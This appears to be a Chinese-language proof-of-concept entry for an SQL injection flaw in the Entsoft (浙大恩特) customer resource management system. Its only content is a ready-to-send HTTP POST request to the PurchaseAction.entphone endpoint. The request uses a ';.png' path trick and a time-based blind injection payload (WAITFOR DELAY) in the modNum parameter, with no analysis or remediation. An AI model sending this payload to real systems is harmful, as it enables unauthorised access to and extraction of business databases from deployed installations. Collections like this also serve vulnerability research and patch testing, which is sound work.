## 浙大恩特客户资源管理系统-purchaseaction.entphone接口存在SQL漏洞

## poc
```
POST /entsoft/PurchaseAction.entphone;.png?method=AuthorityJudgement HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Length: 34
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=90D5118EEBB1F0D4630E802596D8E42F

modNum=1';WAITFOR DELAY '0:0:4'--+
```
